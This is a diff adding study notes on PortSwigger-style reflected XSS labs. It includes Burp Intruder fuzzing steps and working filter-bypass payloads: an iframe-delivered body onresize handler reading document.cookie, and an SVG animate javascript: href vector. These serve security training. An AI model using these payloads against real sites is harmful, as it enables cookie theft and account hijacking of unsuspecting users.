@@ -139,6 +139,12 @@ Some useful ways of executing JavaScript are:
                         
                         
                               ## REFLECTIVE XSS INTO HTML WITH MOST TAG BLOCKED
+STEP1: In Burp Intruder, in the Positions tab, click "Clear §". Replace the value of the search term with: <> 
+STEP2: Place the cursor between the angle brackets and click "Add §" twice, to create a payload position. The value of the search term should now look like: <§§>
+STEP3: Visit the XSS cheat sheet and click "Copy tags to clipboard". 
+STEP4: Go back to the Positions tab in Burp Intruder and replace your search term with: <body%20=1>
+STEP5: Place the cursor before the = character and click "Add §" twice, to create a payload position. The value of the search term should now look like: <body%20§§=1>
+
 # <iframe src="https://your-lab-id.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=alert(document.cookie)%3E" onload=this.style.width='100px'>
 
                        
@@ -148,5 +154,13 @@ Some useful ways of executing JavaScript are:
   </script>                           
                         
 
+
+                   ## Reflected XSS with event handlers and href attributes blocked
+# This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.. 
+# To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function. 
+#  Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:
+<a href="">Click me</a>
+
+# https://YOUR-LAB-ID.web-security-academy.net/?search=%3Csvg%3E%3Ca%3E%3Canimate+attributeName%3Dhref+values%3Djavascript%3Aalert(1)+%2F%3E%3Ctext+x%3D20+y%3D20%3EClick%20me%3C%2Ftext%3E%3C%2Fa%3E
                           
                       
